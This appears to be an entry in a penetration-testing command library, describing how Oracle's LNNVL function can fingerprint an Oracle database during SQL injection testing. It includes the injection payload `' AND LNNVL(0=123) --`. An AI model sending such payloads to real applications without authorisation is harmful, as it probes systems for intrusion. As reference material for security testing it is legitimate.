---
type: command
executor: sql
data: LNNVL(0=123)
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# oracle-lnnvl-test

## Command

```sql
LNNVL(0=123)
```

## Description

Oracle's LNNVL function returns true for null or false conditions; used here to test (LNNVL(false)=true).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND LNNVL(0=123) --`

## Expected Output

True response if Oracle.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/oracle-rawtohex-test]]
